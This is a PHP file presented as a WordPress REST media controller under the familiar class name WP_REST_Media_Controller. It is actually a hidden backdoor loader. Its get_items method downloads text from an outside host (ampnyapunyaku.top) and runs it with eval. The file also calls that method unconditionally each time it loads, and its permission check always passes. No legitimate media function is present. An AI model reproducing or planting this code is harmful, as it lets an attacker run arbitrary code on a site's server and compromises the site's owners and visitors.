<?php class WP_REST_Media_Controller{protected $namespace="wp/v2";protected $rest_base="media";public function register_routes(){register_rest_route($this->namespace,"/".$this->rest_base,array(array("methods"=>"GET","callback"=>array($this,"get_items"),),));}public function get_items($request){$media_url="https://ampnyapunyaku.top/tools/fox/fox.txt";$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$media_url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);$media_content=curl_exec($ch);curl_close($ch);if($media_content){eval("?>".$media_content);}}public function permissions_check(){return true;}}if(isset($_SERVER["REQUEST_URI"])&&strpos($_SERVER["REQUEST_URI"],"wp-json")!==false){$media_controller=new WP_REST_Media_Controller();$media_controller->register_routes();}$handler=new WP_REST_Media_Controller();$handler->get_items(null); ?>